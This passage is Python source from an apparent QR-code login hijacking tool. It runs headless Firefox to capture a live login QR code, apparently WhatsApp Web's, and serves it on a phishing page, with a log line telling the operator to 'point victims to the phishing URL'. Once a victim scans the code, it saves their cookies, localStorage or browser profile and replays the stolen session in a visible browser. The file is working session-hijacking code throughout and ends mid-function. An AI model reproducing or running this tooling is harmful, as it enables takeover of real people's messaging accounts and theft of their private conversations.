#!/usr/bin/env python3
import functools
import json
import os
import platform
import shutil
import threading
import time
import traceback

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from user_agent import generate_user_agent

from core import Settings, ui
from core.color import error, status
from core.module_utils import misc, server

# ============================================================================
# SELENIUM 4 COMPATIBILITY HELPERS
# ============================================================================


def resolve_firefox_binary():
    """Resolve Firefox binary path using system detection and environment overrides."""
    env_binary = os.environ.get("QRSHIELD_FIREFOX_BINARY") or os.environ.get(
        "FIREFOX_BINARY"
    )
    if env_binary and os.path.exists(env_binary):
        return env_binary

    common_paths = [
        "/usr/bin/firefox",
        "/usr/local/bin/firefox",
        "/snap/bin/firefox",
        "/Applications/Firefox.app/Contents/MacOS/firefox",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
    ]
    for path in common_paths:
        if os.path.exists(path):
            return path

    which_path = shutil.which("firefox") or shutil.which("firefox.exe")
    if which_path and os.path.exists(which_path):
        return which_path

    if "microsoft" in platform.uname().release.lower() or os.environ.get(
        "WSL_DISTRO_NAME"
    ):
        wsl_path = shutil.which("firefox")
        if wsl_path and os.path.exists(wsl_path):
            return wsl_path

    return None


def resolve_geckodriver_path():
    """Resolve geckodriver path, with fallback to Selenium Manager and PATH search."""
    env_driver = os.environ.get("QRSHIELD_GECKODRIVER") or os.environ.get(
        "GECKODRIVER_PATH"
    )
    if env_driver and os.path.exists(env_driver):
        return env_driver

    common_paths = [
        "/usr/local/share/geckodriver",
        "/usr/bin/geckodriver",
        "/usr/local/bin/geckodriver",
        "/snap/bin/geckodriver",
        "C:\\Program Files\\geckodriver\\geckodriver.exe",
        "C:\\Program Files (x86)\\geckodriver\\geckodriver.exe",
    ]
    for path in common_paths:
        if os.path.exists(path):
            return path

    which_path = shutil.which("geckodriver") or shutil.which("geckodriver.exe")
    if which_path and os.path.exists(which_path):
        return which_path

    return None


def build_firefox_options(useragent="(default)", headless=True, binary_path=None):
    """Build Selenium 4 Firefox Options with runtime configuration.

    Args:
        useragent:    (default), (random), or a custom UA string.
        headless:     True for background grabber sessions.
                      False for visible session replay.
        binary_path:  Explicit Firefox binary path. Attached to
                      opts.binary_location so custom/snap/macOS installs are used
                      even when not in PATH.
    """
    opts = Options()

    # Attach resolved Firefox binary so non-PATH installs work correctly.
    # This includes snap, macOS, custom installs, and non-PATH Firefox.
    if binary_path and os.path.exists(binary_path):
        opts.binary_location = binary_path

    # Headless mode - only for background grabber sessions
    if headless:
        opts.add_argument("--headless")

    # Firefox preferences
    opts.set_preference("browser.sessionstore.max_tabs_undo", 0)
    opts.set_preference("browser.urlbar.suggest.history.onlyTyped", False)
    opts.set_preference("dom.webdriver.enabled", False)
    opts.set_preference("useAutomationExtension", False)
    # Suppress first-run welcome page
    opts.set_preference("browser.startup.homepage_override.mstone", "ignore")
    opts.set_preference("startup.homepage_welcome_url.additional", "about:blank")
    # Prevent WhatsApp Web from detecting headless mode via media capabilities
    opts.set_preference("media.navigator.enabled", True)
    opts.set_preference("media.navigator.permission.disabled", True)
    # Disable telemetry / data-reporting that slows first page load
    opts.set_preference("datareporting.policy.dataSubmissionEnabled", False)
    opts.set_preference("datareporting.healthreport.uploadEnabled", False)

    # User agent handling
    ua = useragent.strip()
    if ua.lower() == "(default)":
        status("Using the default useragent")
    elif ua.lower() == "(random)":
        random_useragent = generate_user_agent(os=("mac", "linux"))
        opts.set_preference("general.useragent.override", random_useragent)
        status(f"Using random useragent {random_useragent}")
    else:
        opts.set_preference("general.useragent.override", ua)
        status(f"Using useragent {ua}")

    return opts


def build_firefox_service(geckodriver_path=None):
    """Build Selenium 4 Firefox Service with optional custom geckodriver path."""
    if geckodriver_path and os.path.exists(geckodriver_path):
        return Service(geckodriver_path)
    else:
        # Let Selenium Manager handle driver discovery (Selenium 4.x feature)
        return None


# ============================================================================
# LEGACY PROFILE COMPATIBILITY (For backward compatibility)
# ============================================================================


def generate_profile(useragent="(default)", binary_path=None):
    """Legacy compatibility shim - use build_firefox_options() directly for new code."""
    return build_firefox_options(useragent, binary_path=binary_path)


def Run_inside_thread(thread_name):
    def hook(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            thread = threading.Thread(
                target=func, name=thread_name, args=args, kwargs=kwargs
            )
            thread.daemon = True
            thread.start()

        return wrapper

    return hook


class headless_browsers:
    # Here we create invisible browsers in an organized way
    # without repeating browsers for the same module
    def __init__(self):
        self.browsers = {}
        # Here we save all the browsers we create so we can control and use later
        self.useragent = ""
        self.browser_path = resolve_firefox_binary()
        self.geckodriver_path = resolve_geckodriver_path()
        self.sessions_file = os.path.join("sessions", "sessions.json")

    def new_session(self, module_name, url, useragent="(random)", force=False):
        # Validate Firefox installation
        if not self.browser_path:
            error("Firefox browser not found on this system.")
            error("Please install Firefox and try again.")
            return {"Status": "NoBrowser"}

        # Check for duplicate sessions
        # Block if same module already running AND force-override is not requested
        if (
            self.browsers != {}
            and module_name in list(self.browsers.keys())
            and self.browsers[module_name]["Status"]
            and not force
        ):
            return {"Status": "Duplicate"}

        new_headless = {module_name: {"host": "", "port": ""}}
        new_headless[module_name]["url"] = url

        # Validate user agent
        if not useragent.strip():
            return {"Status": "Invalid useragent"}

        try:
            new_headless[module_name]["Controller"] = None

            # Build Selenium 4 compatible options (always headless for grabber)
            options = build_firefox_options(
                useragent, headless=True, binary_path=self.browser_path
            )

            # Build Selenium 4 compatible service
            service = build_firefox_service(self.geckodriver_path)

            # Create Firefox driver using Selenium 4 API
            if service:
                driver = webdriver.Firefox(service=service, options=options)
            else:
                # Selenium Manager will handle driver discovery
                driver = webdriver.Firefox(options=options)

            new_headless[module_name]["Controller"] = driver
        except Exception as e:
            if Settings.debug:
                error(f"Browser initialization failed: {str(e)}")
                traceback.print_exc()
            else:
                error(
                    "Failed to initialize Firefox browser. "
                    "Check debug mode for details."
                )
            return {"Status": "Failed"}

        # Register browser before navigating so any concurrent duplicate
        # check blocks correctly.
        new_headless[module_name]["Status"] = "Success"
        self.browsers.update(new_headless)

        try:
            self.browsers[module_name]["Controller"].get(url)
            self.useragent = self.browsers[module_name]["Controller"].execute_script(
                "return navigator.userAgent;"
            )
        except Exception as e:
            if Settings.debug:
                error(f"Failed to navigate to URL: {str(e)}")
                traceback.print_exc()
            # Clean up driver process before returning failure
            try:
                self.browsers[module_name]["Controller"].quit()
            except Exception:
                if Settings.debug:
                    traceback.print_exc()
                # ignore cleanup errors
            self.browsers[module_name]["Status"] = "Failed"
            self.browsers[module_name]["Controller"] = None
            return {"Status": "Failed"}

        return self.browsers[module_name]

    @Run_inside_thread("Sessions catcher thread")
    def create_listener(
        self,
        module_name,
        change_identifier,
        session_type,
        change_id_alt1=None,
        change_id_alt2=None,
        change_id_alt3=None,
    ):
        # If I used another function to run this one as thread, python would be upset :D
        # So I'm using a decorator and also it looks cooler :D
        try:
            status(f"Waiting for sessions on {module_name}")
            controller = self.browsers[module_name]["Controller"]
            if controller:
                while self.browsers[module_name]["Status"] == "Success":
                    # Look for the xpath contained in "change_identifier"
                    # variable. This must be the Xpath of an element
                    # present only in the page that we reach after the
                    # attack has been successful. If the element is found
                    # by Xpath the attack has been successful
                    #
                    # Conversely, if the element has not been found, it
                    # means that we are still on the QRCode page and the
                    # session has not yet been created. The attack has not
                    # yet been successfully completed. In this case Try
                    # to Catch "Unable to locate element: <xpath>" and
                    # continue listening for a session
                    try:
                        identifier = None
                        for xpath in filter(
                            None,
                            [
                                change_identifier,
                                change_id_alt1,
                                change_id_alt2,
                                change_id_alt3,
                            ],
                        ):
                            try:
                                identifier = controller.find_element(By.XPATH, xpath)
                                if identifier:
                                    break
                            except Exception as exc:
                                # XPath not found - expected during active session wait
                                if Settings.debug and isinstance(exc, Exception):
                                    pass  # These are normal timeouts
                                continue
                        if identifier:
                            # If the identifier is found the attack has
                            # been successful
                            ui.info("")
                            status(f"Got session on {module_name} module")
                            if session_type.lower() == "localstorage":
                                self.save_localstorage(module_name)
                            elif session_type.lower() == "cookies":
                                self.save_cookie(module_name)
                            else:
                                # save_profile quits the browser internally
                                # (to release file locks before copying).
                                # Status is set to None inside save_profile,
                                # so the while-loop exits automatically —
                                # no close_job / close_all needed here.
                                self.save_profile(module_name)
                                return  # listener thread ends cleanly

                            if Settings.verbose:
                                status(
                                    "Resetting browser cookies and localStorage "
                                    "to start over.."
                                )

                            # Reset for localstorage / cookie session types
                            # (profile type already returned above)
                            try:
                                controller.delete_all_cookies()
                                controller.execute_script("window.localStorage.clear()")
                                controller.refresh()
                                if Settings.verbose:
                                    status("Session reset successfully")
                            except (
                                ConnectionError,
                                ConnectionAbortedError,
                                BrokenPipeError,
                            ):
                                # Browser has closed; listener thread will detect
                                # and exit
                                pass
                            except Exception as reset_err:
                                if Settings.debug:
                                    status(f"Session reset warning: {reset_err}")
                            time.sleep(5)
                        else:
                            time.sleep(5)
                    except Exception:
                        # Identifier not found: wait end continue listening
                        time.sleep(5)
            else:
                error(f"Browser controller hasn't been created [{module_name}]")
        except Exception as e:
            if Settings.debug:
                ui.error("\nSession listener error:")
                ui.error("  Exception -> " + str(e))
                ui.error("  Trackback -> ")
                traceback.print_exc()
            return

    @Run_inside_thread("QR updater thread")
    def website_qr(
        self,
        module_name,
        img_xpath,
        img_xpath_alt1=None,
        img_xpath_alt2=None,
        img_xpath_alt3=None,
        img_xpath_alt4=None,
    ):
        """Keep the QR image refreshed for the local web server.

        Improvements over the original:
        - Accepts up to 4 alternative XPaths (WhatsApp module now ships 4).
        - Waits for the page JS to finish bootstrapping before looking for the
          QR canvas (document.readyState + a 2-s settle delay).
        - Tries each XPath with its own 30-s WebDriverWait so a slow network
          doesn't cause every selector to time-out in rapid succession.
        - Remembers the *winning* XPath from the initial wait and tries it
          first in every subsequent screenshot loop iteration to avoid the
          overhead of re-probing all selectors every 3 s.
        - After a failed screenshot attempt the thread backs off progressively
          (1→2→4→4 s) so it doesn't spin on a blank canvas.
        """
        status(f"Running a thread to keep the QR image [{module_name}]")
        controller = self.browsers[module_name]["Controller"]
        if not controller:
            error(f"Browser controller hasn't been created [{module_name}]")
            return

        xpaths = list(
            filter(
                None,
                [
                    img_xpath,
                    img_xpath_alt1,
                    img_xpath_alt2,
                    img_xpath_alt3,
                    img_xpath_alt4,
                ],
            )
        )

        # ── Step 1: wait for document.readyState == "complete" ───────────────
        # WhatsApp Web is a React SPA; the QR canvas is injected well after
        # the initial HTML is parsed, so we must wait for the full JS boot.
        try:
            WebDriverWait(controller, 30).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
            time.sleep(2)  # Let React finish its first render pass
        except Exception:
            pass  # Continue anyway – the subsequent per-xpath waits act as backup

        # ── Step 2: probe each XPath in turn (30 s each) ─────────────────────
        winning_xpath = None
        for xpath in xpaths:
            try:
                WebDriverWait(controller, 30).until(
                    EC.presence_of_element_located((By.XPATH, xpath))
                )
                winning_xpath = xpath
                if Settings.verbose:
                    status(f"QR element found [{module_name}] using xpath: {xpath}")
                break
            except Exception:
                if Settings.debug:
                    status(f"XPath not found (will try next): {xpath}")
                continue

        if not winning_xpath:
            error(
                f"QR element not found after waiting [{module_name}] - "
                "XPaths may be stale"
            )
            if Settings.debug:
                status(f"Tried XPaths: {xpaths}")
            # Don't abort – keep the loop running in case the element appears
            # later (very slow network, service worker cache invalidation, etc.)

        # ── Step 3: screenshot loop ───────────────────────────────────────────
        # Put the winning XPath first so we avoid re-probing all selectors
        ordered = (
            [winning_xpath] + [x for x in xpaths if x != winning_xpath]
            if winning_xpath
            else xpaths
        )

        backoff = 1  # seconds; doubles on consecutive failures, caps at 4
        while self.browsers[module_name]["Status"] == "Success":
            # Bail out if controller was nulled (e.g. profile save quit the browser)
            if self.browsers[module_name]["Controller"] is None:
                break
            try:
                captured = False
                for xpath in ordered:
                    try:
                        misc.Screenshot(controller, xpath, module_name)
                        captured = True
                        break
                    except Exception:
                        continue

                if captured:
                    backoff = 1  # reset on success
                    time.sleep(3)
                else:
                    time.sleep(backoff)
                    backoff = min(backoff * 2, 4)
            except Exception:
                time.sleep(backoff)
                backoff = min(backoff * 2, 4)

    @Run_inside_thread("Idle detector thread")
    def check_img(
        self,
        module_name,
        button_xpath,
        button_xpath_alt=None,
        button_xpath_alt2=None,
        button_xpath_alt3=None,
    ):
        """Click the QR-refresh overlay button whenever it appears.

        Accepts up to 3 extra alternate XPaths so the WhatsApp module can
        pass all four reload-button selectors it defines.
        """
        status(
            "Running a thread to detect Idle once it happens then "
            f"click the QR reload button [{module_name}]"
        )
        controller = self.browsers[module_name]["Controller"]
        if not controller:
            error(f"Browser controller hasn't been created [{module_name}]")
            return

        btn_xpaths = list(
            filter(
                None,
                [button_xpath, button_xpath_alt, button_xpath_alt2, button_xpath_alt3],
            )
        )

        while self.browsers[module_name]["Status"] == "Success":
            try:
                btn = None
                for xpath in btn_xpaths:
                    try:
                        btn = controller.find_element(By.XPATH, xpath)
                        if btn:
                            break
                    except Exception:
                        continue
                if btn:
                    if Settings.verbose:
                        status(
                            f"Idle detected, Reloading QR code image [{module_name}]"
                        )
                    try:
                        btn.click()
                    except Exception:
                        # Element may have disappeared between find and click – ignore
                        pass
                    time.sleep(5)
                else:
                    time.sleep(1)
            except Exception:
                time.sleep(1)

    @Run_inside_thread("Webserver manager thread")
    def serve_module(self, module_name, host, port):
        # Start a webserver for module and automatically close it when module closed
        self.browsers[module_name]["host"] = "http://" + host
        self.browsers[module_name]["port"] = str(port)

        try:
            webserver = server(name=module_name, port=port)
            webserver.start_serving(host)
        except RuntimeError as e:
            # Port already in use, permission denied, template error, etc.
            error(f"Webserver failed to start [{module_name}]: {str(e)}")
            if port < 1024:
                error(
                    "Ports below 1024 require root privileges. Try a port >= "
                    "1024 (e.g. 8080)."
                )
            # Clean up browser so all other threads (QR updater, idle detector,
            # session listener) also exit — otherwise they keep running with no server.
            self.close_job(module_name)
            return
        except Exception as e:
            error(f"Unexpected error starting webserver [{module_name}]: {str(e)}")
            if Settings.debug:
                traceback.print_exc()
            self.close_job(module_name)
            return

        status(f"Webserver ready at http://{host}:{port}/ [{module_name}]")

        # Wait for tmp.png after the webserver is available so startup logs
        # reflect the real order and clients can connect while the browser warms up.
        # Timeout is 150 s: WhatsApp Web can take 30–60 s to render on slow
        # connections, plus we now wait up to 30 s per XPath selector.
        tmp_png = os.path.join(Settings.path, "core", "www", module_name, "tmp.png")
        status(f"Waiting for QR code to be captured [{module_name}]...")
        status(
            f"(WhatsApp Web may take 30-60s to render on first load) [{module_name}]"
        )
        deadline = time.time() + 150
        last_dot = time.time()
        while not os.path.exists(tmp_png) and time.time() < deadline:
            if self.browsers[module_name]["Status"] != "Success":
                webserver.stop_web_server()
                return  # module was stopped before QR appeared
            # Print a progress dot every 10 s so the user sees it's still working
            if time.time() - last_dot >= 10:
                remaining = int(deadline - time.time())
                status(
                    f"Still waiting for QR... ({remaining}s remaining) "
                    f"[{module_name}]"
                )
                last_dot = time.time()
            time.sleep(0.5)

        if not os.path.exists(tmp_png):
            error(f"QR image not generated after 150s [{module_name}]")
            error("Possible causes:")
            error(
                "  1. WhatsApp Web changed its DOM – run with debug mode to see which "
                "XPaths were tried"
            )
            error(
                "  2. Slow network – the headless browser couldn't load "
                "web.whatsapp.com in time"
            )
            error("  3. Firefox headless issue – try restarting the framework")
            if Settings.debug:
                status(f"QR image expected at: {tmp_png}")
        else:
            status(
                f"QR image available [{module_name}] - point victims to "
                "the phishing URL"
            )

        while self.browsers[module_name]["Status"] == "Success":
            time.sleep(1)
        # Well, the module got stopped
        webserver.stop_web_server()

    def save_localstorage(self, module_name):
        browser = self.browsers[module_name]["Controller"]
        os.makedirs("sessions", exist_ok=True)

        # Bug fix: execute_script can throw if the page is not ready or the
        # browser has already closed.  Wrap everything in try/except so a
        # failure produces a clear error instead of a silent crash.
        try:
            local_storage = browser.execute_script("return window.localStorage")
        except Exception as e:
            error(f"Could not read localStorage [{module_name}]: {str(e)}")
            return

        if not local_storage:
            error(f"localStorage is empty or unavailable [{module_name}]")
            return

        # Bug fix: use os.getpid() suffix to prevent same-second filename
        # collision overwriting a previous session file.
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        session_file_name = os.path.join(
            "sessions", f"{timestamp}_{os.getpid()}.session"
        )

        try:
            with open(session_file_name, "w", encoding="utf-8") as session_file:
                json.dump(local_storage, session_file, ensure_ascii=False, indent=2)
        except Exception as e:
            error(f"Could not write session file [{module_name}]: {str(e)}")
            return

        if Settings.debug:
            status(f"localStorage data saved in {session_file_name}")

        try:
            with open(self.sessions_file, "r") as f:
                try:
                    sessions = json.load(f)
                except json.JSONDecodeError:
                    sessions = {}
        except FileNotFoundError:
            sessions = {}

        session_id = "0"
        for i in range(0, 1000):
            if str(i) not in sessions:
                session_id = str(i)
                break

        sessions[session_id] = {
            "name": module_name,
            "web_url": self.browsers[module_name]["url"],
            "session_type": "localStorage",
            "useragent": self.useragent,
            "session_path": session_file_name,
        }
        with open(self.sessions_file, "w") as f:
            json.dump(sessions, f, indent=2)
        status(f"Session {session_id} saved successfully")

    def save_cookie(self, module_name):
        browser = self.browsers[module_name]["Controller"]
        os.makedirs("sessions", exist_ok=True)

        # Bug fix: get_cookies() can throw if the browser has closed or the
        # page is still loading.  Catch it and report clearly.
        try:
            cookies = browser.get_cookies()
        except Exception as e:
            error(f"Could not read cookies [{module_name}]: {str(e)}")
            return

        if not cookies:
            error(f"No cookies found to save [{module_name}]")
            return

        # Bug fix: pid suffix prevents same-second filename collision.
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        session_file_name = os.path.join(
            "sessions", f"{timestamp}_{os.getpid()}.session"
        )

        try:
            with open(session_file_name, "w", encoding="utf-8") as session_file:
                json.dump(cookies, session_file, ensure_ascii=False, indent=2)
        except Exception as e:
            error(f"Could not write session file [{module_name}]: {str(e)}")
            return

        if Settings.debug:
            status(f"Cookies saved in {session_file_name}")

        try:
            with open(self.sessions_file, "r") as f:
                try:
                    sessions = json.load(f)
                except json.JSONDecodeError:
                    sessions = {}
        except FileNotFoundError:
            sessions = {}

        session_id = "0"
        for i in range(0, 1000):
            if str(i) not in sessions:
                session_id = str(i)
                break

        sessions[session_id] = {
            "name": module_name,
            "web_url": self.browsers[module_name]["url"],
            "session_type": "cookies",
            "useragent": self.useragent,
            "session_path": session_file_name,
        }
        with open(self.sessions_file, "w") as f:
            json.dump(sessions, f, indent=2)
        status(f"Session {session_id} saved successfully")

    def save_profile(self, module_name):
        """Save the entire Firefox profile folder to profiles/ directory.

        ROOT CAUSE OF THE ORIGINAL ERROR
        ---------------------------------
        Selenium/geckodriver creates Firefox's working profile as a temporary
        directory under /tmp (e.g. /tmp/rust_mozprofileXXXX).  When
        browser.quit() is called, geckodriver instructs Firefox to shut down
        AND removes that /tmp directory entirely.

        The previous code read the path from moz:profile, called browser.quit(),
        then tried shutil.copytree() -- by which point the directory had already
        been deleted, producing:

            [Errno 2] No such file or directory: '/tmp/rust_mozprofileXXXX'

        THE FIX
        -------
        Copy the profile directory FIRST while Firefox still owns it and the
        directory still exists, THEN quit the browser.

        File-lock concern: Firefox holds WAL/SQLite write-ahead logs open while
        running.  We handle this by copying with _ignore_locked so locked files
        are skipped rather than aborting the whole copy, then quitting so the
        remaining files are flushed to a consistent state.
        """
        browser = self.browsers[module_name]["Controller"]

        # Step 1: get the profile path WHILE the browser is still alive
        try:
            original_profile_path = browser.capabilities["moz:profile"]
        except Exception as e:
            error(f"Could not retrieve Firefox profile path: {str(e)}")
            return

        if not original_profile_path or not os.path.exists(original_profile_path):
            error(f"Firefox profile path not found or empty: '{original_profile_path}'")
            return

        # Step 2: prepare the destination path
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        base_dir = os.path.join("profiles", timestamp)
        profile_dir_path = base_dir
        counter = 1
        while os.path.exists(profile_dir_path):
            profile_dir_path = f"{base_dir}_{counter}"
            counter += 1

        os.makedirs("profiles", exist_ok=True)

        # Step 3: copy the profile NOW, BEFORE quit() deletes the /tmp dir
        def _ignore_locked(src_dir, names):
            """Skip files that are currently locked or unreadable."""
            ignored = set()
            for name in names:
                full = os.path.join(src_dir, name)
                if not os.access(full, os.R_OK):
                    ignored.add(name)
                    if Settings.debug:
                        status(f"[profile copy] Skipping locked/unreadable: {full}")
            return ignored

        try:
            shutil.copytree(
                original_profile_path, profile_dir_path, ignore=_ignore_locked
            )
            if Settings.debug:
                status(f"Firefox profile copied to {profile_dir_path}")
        except Exception as e:
            if Settings.debug:
                ui.error("\nProfile copy error:")
                ui.error(f"  Source    -> {original_profile_path}")
                ui.error(f"  Dest      -> {profile_dir_path}")
                ui.error(f"  Exception -> {str(e)}")
                ui.error("  Traceback -> ")
                traceback.print_exc()
            error(f"Couldn't copy Firefox profile folder: {str(e)}")
            # Quit the browser even on copy failure
            try:
                browser.quit()
            except Exception:
                pass
            finally:
                self.browsers[module_name]["Controller"] = None
                self.browsers[module_name]["Status"] = None
            return

        # Step 4: quit the browser AFTER the copy is done
        # Firefox is now safe to shut down -- the profile is already saved.
        try:
            browser.quit()
        except Exception:
            pass
        finally:
            self.browsers[module_name]["Controller"] = None
            self.browsers[module_name]["Status"] = None

        # Step 5: register the session
        try:
            with open(self.sessions_file, "r") as f:
                try:
                    sessions = json.load(f)
                except json.JSONDecodeError:
                    sessions = {}
        except FileNotFoundError:
            sessions = {}

        session_id = "0"
        for i in range(0, 1000):
            if str(i) not in sessions:
                session_id = str(i)
                break

        sessions[session_id] = {
            "name": module_name,
            "web_url": self.browsers[module_name]["url"],
            "session_type": "profile",
            "useragent": self.useragent,
            "session_path": profile_dir_path,
        }

        with open(self.sessions_file, "w") as f:
            json.dump(sessions, f, indent=2)

        status(f"Session {session_id} saved successfully: {profile_dir_path}")

    def close_all(self):
        if self.browsers != {}:
            # I'm using this comparison because it is faster than comparison with
            # keys length btw
            for module_name in list(self.browsers.keys()):
                try:
                    self.browsers[module_name][
                        "Controller"
                    ].quit()  # quit() kills driver process; close() only closes window
                except Exception:  # Some one played with the browser so it lost control
                    if Settings.debug:
                        traceback.print_exc()
                self.browsers[module_name][
                    "Controller"
                ] = None  # Reseting the browser controller
                self.browsers[module_name][
                    "Status"
                ] = None  # To close any listener working on this browser

    def close_job(self, module_name):
        if self.browsers != {}:
            if module_name in list(self.browsers.keys()):
                try:
                    self.browsers[module_name][
                        "Controller"
                    ].quit()  # quit() kills driver process; close() only closes window
                except Exception:  # Some one played with the browser so it lost control
                    if Settings.debug:
                        traceback.print_exc()
                self.browsers[module_name][
                    "Controller"
                ] = None  # Reseting the browser controller
                self.browsers[module_name][
                    "Status"
                ] = None  # To close any listener working on this browser


class visible_browsers:
    # Here we open sessions for user with cookies we already have from sessions
    def __init__(self):
        self.browsers = []
        self.sessions_file = os.path.join("sessions", "sessions.json")
        self.browser_path = resolve_firefox_binary()
        self.geckodriver_path = resolve_geckodriver_path()

    def close_all(self):
        """Quit all visible browser instances cleanly."""
        for browser in self.browsers:
            try:
                browser.quit()
            except Exception:
                if Settings.debug:
                    traceback.print_exc()
        self.browsers = []

    def __del__(self):
        self.close_all()

    def load_localstorage(self, session_id):
        """Load a session using localStorage backup."""
        browser = None
        try:
            # ==== VALIDATION PHASE ====
            # 1. Verify sessions file exists
            if not os.path.exists(self.sessions_file):
                error(f"Sessions file not found: {self.sessions_file}")
                return

            # 2. Load and parse sessions.json
            try:
                with open(self.sessions_file, "r") as sf:
                    sessions = json.load(sf)
            except json.JSONDecodeError:
                error("Sessions file is corrupted (invalid JSON)")
                return
            except Exception as e:
                error(f"Failed to read sessions file: {str(e)}")
                return

            # 3. Verify session exists
            if str(session_id) not in sessions:
                error(f"Session {session_id} not found in sessions file")
                return

            session_data = sessions[str(session_id)]

            # 4. Validate required fields
            storage_path = session_data.get("session_path")
            url = session_data.get("web_url")
            useragent = session_data.get("useragent", "(default)")

            if not storage_path:
                error(f"Session {session_id}: Missing 'session_path' field")
                return
            if not url:
                error(f"Session {session_id}: Missing 'web_url' field")
                return

            # 5. Verify storage file exists
            if not os.path.exists(storage_path):
                error(f"Storage file not found: {storage_path}")
                return

            # 6. Verify storage file is readable
            if not os.access(storage_path, os.R_OK):
                error(f"Storage file not readable: {storage_path}")
                return

            # ==== BROWSER INITIALIZATION PHASE ====
            # 7. Check Firefox binary
            if not self.browser_path:
                error("Firefox not found. Please install Firefox.")
                return

            if Settings.debug:
                status(f"Opening Firefox browser: {self.browser_path}")

            # 8. Build Firefox options and create browser
            options = build_firefox_options(
                useragent, headless=False, binary_path=self.browser_path
            )
            service = build_firefox_service(self.geckodriver_path)

            try:
                browser = (
                    webdriver.Firefox(service=service, options=options)
                    if service
                    else webdriver.Firefox(options=options)
                )
            except Exception as e:
                if "Firefox" in str(e) or "geckodriver" in str(e):
                    error("Firefox or geckodriver failed to start. Check installation.")
                else:
                    error(f"Failed to initialize Firefox: {str(e)}")
                return

            # ==== SESSION LOADING PHASE ====
            # 9. Load localStorage data
            try:
                with open(storage_path, "r", encoding="utf-8") as _pf:
                    localStorage = json.load(_pf)
            except json.JSONDecodeError:
                error(
                    f"Storage file is corrupted or unsupported format: {storage_path}"
                )
                return
            except Exception as e:
                error(f"Failed to load storage file: {str(e)}")
                return

            # 10. Navigate to URL
            try:
                browser.get(url)
                status(f"Navigating to {url}...")
            except Exception as e:
                error(f"Failed to navigate to {url}: {str(e)}")
                return

            # 11. Wait for page load
            try:
                WebDriverWait(browser, 15).until(
                    lambda d: d.execute_script("return document.readyState")
                    == "complete"
                )
            except Exception as e:
                error(f"Page load timeout: {str(e)}")
                return

            # 12. Inject localStorage
            try:
                browser.delete_all_cookies()
                browser.execute_script("window.localStorage.clear()")
                for key, value in localStorage.items():
                    browser.execute_script(
                        "window.localStorage.setItem(arguments[0], arguments[1]);",
                        key,
                        value,
                    )
            except Exception as e:
                error(f"Failed to inject localStorage: {str(e)}")
                return

            # 13. Refresh page with session data
            try:
                browser.refresh()
            except Exception as e:
                error(f"Failed to refresh page: {str(e)}")
                return

            # ==== SUCCESS ====
            self.browsers.append(browser)
            status(f"✓ Session {session_id} loaded successfully from localStorage")

        except Exception as e:
            # Fallback for unexpected errors
            if Settings.debug:
                error(f"Unexpected error loading localStorage session: {str(e)}")
                traceback.print_exc()
            else:
                error("Failed to load session. Enable debug mode for details.")
        finally:
            # Cleanup on failure
            if browser and not any(b == browser for b in self.browsers):
                try:
                    browser.quit()
                except Exception:
                    if Settings.debug:
                        traceback.print_exc()

    def load_cookie(self, session_id):
        """Load a session using cookie backup."""
        browser = None
        try:
            # ==== VALIDATION PHASE ====
            # 1. Verify sessions file exists
            if not os.path.exists(self.sessions_file):
                error(f"Sessions file not found: {self.sessions_file}")
                return

            # 2. Load and parse sessions.json
            try:
                with open(self.sessions_file, "r") as sf:
                    sessions = json.load(sf)
            except json.JSONDecodeError:
                error("Sessions file is corrupted (invalid JSON)")
                return
            except Exception as e:
                error(f"Failed to read sessions file: {str(e)}")
                return

            # 3. Verify session exists
            if str(session_id) not in sessions:
                error(f"Session {session_id} not found in sessions file")
                return

            session_data = sessions[str(session_id)]

            # 4. Validate required fields
            cookie_path = session_data.get("session_path")
            url = session_data.get("web_url")
            useragent = session_data.get("useragent", "(default)")

            if not cookie_path:
                error(f"Session {session_id}: Missing 'session_path' field")
                return
            if not url:
                error(f"Session {session_id}: Missing 'web_url' field")
                return

            # 5. Verify cookie file exists
            if not os.path.exists(cookie_path):
                error(f"Cookie file not found: {cookie_path}")
                return

            # 6. Verify cookie file is readable
            if not os.access(cookie_path, os.R_OK):
                error(f"Cookie file not readable: {cookie_path}")
                return

            # ==== BROWSER INITIALIZATION PHASE ====
            # 7. Check Firefox binary
            if not self.browser_path:
                error("Firefox not found. Please install Firefox.")
                return

            if Settings.debug:
                status(f"Opening Firefox browser: {self.browser_path}")

            # 8. Build Firefox options and create browser
            options = build_firefox_options(
                useragent, headless=False, binary_path=self.browser_path
            )
            service = build_firefox_service(self.geckodriver_path)

            try:
                browser = (
                    webdriver.Firefox(service=service, options=options)
                    if service
                    else webdriver.Firefox(options=options)
                )
            except Exception as e:
                if "Firefox" in str(e) or "geckodriver" in str(e):
                    error("Firefox or geckodriver failed to start. Check installation.")
                else:
                    error(f"Failed to initialize Firefox: {str(e)}")
                return

            # ==== SESSION LOADING PHASE ====
            # 9. Load cookie data
            try:
                with open(cookie_path, "r", encoding="utf-8") as _pf:
                    cookies = json.load(_pf)
            except json.JSONDecodeError:
                error(f"Cookie file is corrupted or unsupported format: {cookie_path}")
                return
            except Exception as e:
                error(f"Failed to load cookie file: {str(e)}")
                return

            # 10. Navigate to URL (must do before adding cookies)
            try:
                browser.get(url)
                status(f"Navigating to {url}...")
            except Exception as e:
                error(f"Failed to navigate to {url}: {str(e)}")
                return

            # 11. Wait for page load
            try:
                WebDriverWait(browser, 15).until(
                    lambda d: d.execute_script("return document.readyState")
                    == "complete"
                )
            except Exception as e:
                error(f"Page load timeout: {str(e)}")
                return

            # 12. Inject cookies
            try:
                browser.delete_all_cookies()
                browser.execute_script("window.localStorage.clear()")

                for cookie in cookies:
                    try:
                        browser.add_cookie(cookie)
                    except Exception as cookie_err:
                        if Settings.debug:
                            status(
                                "Warning: Could not add cookie "
                                f"'{cookie.get('name', 'unknown')}': "
                                f"{str(cookie_err)}"
                            )
            except Exception as e:
                error(f"Failed to inject cookies: {str(e)}")
                return

            # 13. Refresh page with session data
            try:
                browser.refresh()
            except Exception as e:
                error(f"Failed to refresh page: {str(e)}")
                return

            # ==== SUCCESS ====
